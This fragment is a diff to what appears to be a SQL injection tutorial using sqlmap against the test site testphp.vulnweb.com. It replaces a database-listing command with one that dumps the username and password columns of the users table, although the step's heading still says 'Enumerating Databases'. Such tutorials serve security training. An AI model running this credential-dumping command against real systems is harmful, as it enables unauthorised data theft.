@@ -98,8 +98,11 @@ This confirms a boolean-based blind SQL injection in the artist parameter. The p
 ### Step 3: Enumerating Databases
 List available databases:
 
-bash
-sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+```bash
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname,pass --dump --batch
+```
+
+
 
 
 Example output:
